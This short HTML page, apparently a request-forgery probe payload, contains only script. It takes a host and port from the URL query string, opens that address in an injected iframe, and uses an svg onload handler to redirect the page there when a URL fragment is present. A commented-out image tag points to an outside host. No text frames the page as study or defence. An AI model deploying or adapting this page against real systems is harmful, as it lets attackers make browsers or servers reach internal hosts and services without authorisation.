<html>
<head>
</head>
<body>
  <script>
	function getLocation(){
		l=location;if(l.search){a=l.search.split('?')[1].split('=');h=a[0];p=a[1]};
		return `http://${h}:${p}`;
	}

	f=document.createElement('iframe');

	f.src = getLocation()
	document.body.appendChild(f);
  </script>
<svg/onload="if(location.hash){location=getLocation()}">
<!--<img src='http://s.srcb.fun/noresponse'>-->
</body>

</html>
